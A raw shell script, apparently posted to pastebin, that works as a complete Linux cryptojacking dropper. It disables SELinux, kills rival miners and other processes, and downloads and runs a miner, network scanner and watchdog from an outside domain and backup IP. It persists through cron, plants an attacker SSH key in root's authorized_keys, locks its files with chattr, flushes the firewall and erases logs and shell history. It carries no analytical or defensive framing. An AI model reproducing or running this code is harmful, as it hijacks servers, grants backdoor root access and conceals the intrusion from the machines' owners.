https://pastebin.com/PApE4wg4

#!/bin/sh
setenforce 0 2>dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 >/proc/sys/vm/drop_caches
crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/sysupdates
rtdir="/etc/sysupdates"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cur"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wge"
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/xget /usr/bin/get
mv /usr/bin/get /usr/bin/wge
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/xurl /usr/bin/url
mv /usr/bin/url /usr/bin/cur
miner_url="https://de.gsearch.com.de/api/sysupdate"
miner_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/sysupdate"
miner_size="854364"
sh_url="https://de.gsearch.com.de/api/update.sh"
sh_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/update.sh"
config_url="https://de.gsearch.com.de/api/config.json"
config_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/config.json"
config_size="4954"
scan_url="https://de.gsearch.com.de/api/networkservice"
scan_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/networkservice"
scan_size="2584072"
watchdog_url="https://de.gsearch.com.de/api/sysguard"
watchdog_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/sysguard"
watchdog_size="1929480"

kill_miner_proc()
{
    ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
    ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
    ps ax|grep -o './[0-9]* -c'| xargs pkill -f
    pkill -f biosetjenkins
    pkill -f Loopback
    pkill -f apaceha
    pkill -f cryptonight
    pkill -f stratum
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f ir29xc1
    pkill -f conns
    pkill -f irqbalance
    pkill -f crypto-pool
    pkill -f minexmr
    pkill -f XJnRj
    pkill -f mgwsl
    pkill -f pythno
    pkill -f jweri
    pkill -f lx26
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f minerd
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f polkitd
    pkill -f nanoWatch
    pkill -f zigw
    pkill -f devtool
    pkill -f systemctI
    pkill -f WmiPrwSe
	    pkill -f sysguard
		    pkill -f sysupdate
			    pkill -f networkservice
    crontab -r
    rm -rf /var/spool/cron/*
}
downloads()
{
    if [ -f "/usr/bin/curl" ]
    then
	echo $1,$2
        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        else
            curl --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cur" ]
    then
        http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        else
            cur --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=10 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
	then
		wget --timeout=10 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wge" ]
    then
        wge --timeout=10 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wge --timeout=10 --tries=100 -O $2 $3
        fi
    fi
}

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}

kill_miner_proc
kill_sus_proc

if [ -f "$rtdir" ]
then
        echo "i am root"
        echo "goto 1" >> /etc/sysupdate
        chattr -i /etc/sysupdate*
        chattr -i /etc/config.json*
        chattr -i /etc/update.sh*
        chattr -i /root/.ssh/authorized_keys*
	    chattr -i /etc/networkservice
	if [ ! -f "/usr/bin/crontab" ]
		then
			echo "*/30 * * * * sh /etc/update.sh >/dev/null 2>&1" >> ${crondir}
		else
			[[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /etc/update.sh >/dev/null 2>&1") | crontab -
	fi
        chmod 700 /root/.ssh/
        echo >> /root/.ssh/authorized_keys
        chmod 600 root/.ssh/authorized_keys
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17" >> /root/.ssh/authorized_keys


        cfg="/etc/config.json"
        file="/etc/sysupdate"

	if [-f "/etc/config.json" ]
	then
		filesize_config=`ls -l /etc/config.json | awk '{ print $5 }'`
		if [ "$filesize_config" -ne "$config_size" ]
		then
            pkill -f sysupdate
			rm /etc/config.json
            downloads $config_url /etc/config.json $config_url_backup
		else
			echo "no need download"
		fi
	else
		downloads $config_url /etc/config.json $config_url_backup
    fi

    if [ -f "/etc/sysupdate" ]
    then
            filesize1=`ls -l /etc/sysupdate | awk '{ print $5 }'`
            if [ "$filesize1" -ne "$miner_size" ]
            then
                pkill -f sysupdate
                rm /etc/sysupdate
                downloads $miner_url /etc/sysupdate $miner_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $miner_url /etc/sysupdate $miner_url_backup
    fi

    if [ -f "/etc/sysguard" ]
    then
            filesize1=`ls -l /etc/sysguard | awk '{ print $5 }'`
            if [ "$filesize1" -ne "$watchdog_size" ]
            then
                pkill -f sysguard
                rm /etc/sysguard
                downloads $watchdog_url /etc/sysguard $watchdog_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $watchdog_url /etc/sysguard $watchdog_url_backup
    fi

    downloads $sh_url /etc/update.sh $sh_url_backup

    if [ -f "/etc/networkservice" ]
    then
            filesize2=`ls -l /etc/networkservice | awk '{ print $5 }'`
            if [ "$filesize2" -ne "$scan_size" ]
            then
                pkill -f networkservice
                rm /etc/networkservice
                downloads  $scan_url /etc/networkservice $scan_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $scan_url /etc/networkservice $scan_url_backup
    fi

    chmod 777 /etc/sysupdate
    ps -fe|grep sysupdate |grep -v grep
    if [ $? -ne 0 ]
    then
                cd /etc
                echo "not root runing"
                sleep 5s
                ./sysupdate &
    else
                echo "root runing....."
    fi
	chmod 777 /etc/networkservice
    ps -fe|grep networkservice |grep -v grep
    if [ $? -ne 0 ]
    then
                cd /etc
                echo "not roots runing"
                sleep 5s
                ./networkservice &
    else
                echo "roots runing....."
    fi
    chmod 777 /etc/sysguard
    ps -fe|grep sysguard |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmps runing"
                cd /etc
                chmod 777 sysguard
                sleep 5s
                ./sysguard &
            else
                echo "roots runing....."
        fi


    chmod 777 /etc/sysupdate
    chattr +i /etc/sysupdate
	chmod 777 /etc/networkservice
	chattr +i /etc/networkservice
    chmod 777 /etc/config.json
    chattr +i /etc/config.json
    chmod 777 /etc/update.sh
    chattr +i /etc/update.sh
    chmod 777 /root/.ssh/authorized_keys
    chattr +i /root/.ssh/authorized_keys
else
    echo "goto 1" > /tmp/sysupdates
    chattr -i /tmp/sysupdate*
	chattr -i /tmp/networkservice
    chattr -i /tmp/config.json*
    chattr -i /tmp/update.sh*

    if [ ! -f "/usr/bin/crontab" ]
	then
			echo "*/30 * * * * sh /tmp/update.sh >/dev/null 2>&1" >> ${crondir}
	else
			[[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /tmp/update.sh >/dev/null 2>&1") | crontab -
	fi

	if [ -f "/tmp/config.json" ]
	then
		filesize1=`ls -l /tmp/config.json | awk '{ print $5 }'`
		if [ "$filesize1" -ne "$config_size" ]
		then
            pkill -f sysupdate
			rm /tmp/config.json
            downloads  $config_url /tmp/config.json $config_url_backup
		else
			echo "no need download"
		fi
	else
		downloads $config_url /tmp/config.json $config_url_backup
	fi

    if [ -f "/tmp/sysupdate" ]
    then
        filesize1=`ls -l /tmp/sysupdate | awk '{ print $5 }'`
        if [ "$filesize1" -ne "$miner_size" ]
        then
                pkill -f sysupdate
                rm /tmp/sysupdate
                downloads $miner_url /tmp/sysupdate $miner_url_backup
        else
                echo "no need download"
        fi
    else
            downloads $miner_url /tmp/sysupdate $miner_url_backup
    fi

    if [ -f "/tmp/sysguard" ]
    then
            filesize1=`ls -l /tmp/sysguard | awk '{ print $5 }'`
            if [ "$filesize1" -ne "$watchdog_size" ]
            then
                pkill -f sysguard
                rm /tmp/sysguard
                downloads $watchdog_url /tmp/sysguard $watchdog_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $watchdog_url /tmp/sysguard $watchdog_url_backup
    fi

    echo "i am here"
    downloads $sh_url /tmp/update.sh $sh_url_backup

    if [ -f "/tmp/networkservice" ]
    then
        filesize2=`ls -l /tmp/networkservice | awk '{ print $5 }'`
        if [ "$filesize2" -ne "$scan_size" ]
        then
                pkill -f networkservice
	            rm /tmp/networkservice
                downloads $scan_url /tmp/networkservice $scan_url_backup
        else
                echo "no need download"
        fi
    else
            downloads $scan_url /tmp/networkservice $scan_url_backup
    fi

    ps -fe|grep sysupdate |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmp runing"
                cd /tmp
                chmod 777 sysupdate
                sleep 5s
                ./sysupdate &
            else
                echo "tmp runing....."
        fi
	ps -fe|grep networkservice |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmps runing"
                cd /tmp
                chmod 777 networkservice
                sleep 5s
                ./networkservice &
            else
                echo "tmps runing....."
        fi

    ps -fe|grep sysguard |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmps runing"
                cd /tmp
                chmod 777 sysguard
                sleep 5s
                ./sysguard &
            else
                echo "tmps runing....."
        fi

    chmod 777 /tmp/sysupdate
    chattr +i /tmp/sysupdate
	chmod 777 /tmp/networkservice
	chattr +i /tmp/networkservice
	chmod 777 /tmp/sysguard
	chattr +i /tmp/sysguard
    chmod 777 /tmp/update.sh
    chattr +i /tmp/update.sh
    chmod 777 /tmp/config.json
    chattr +i /tmp/config.json

fi
iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
iptables -I INPUT -s 43.245.222.57 -j DROP
service iptables reload
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history
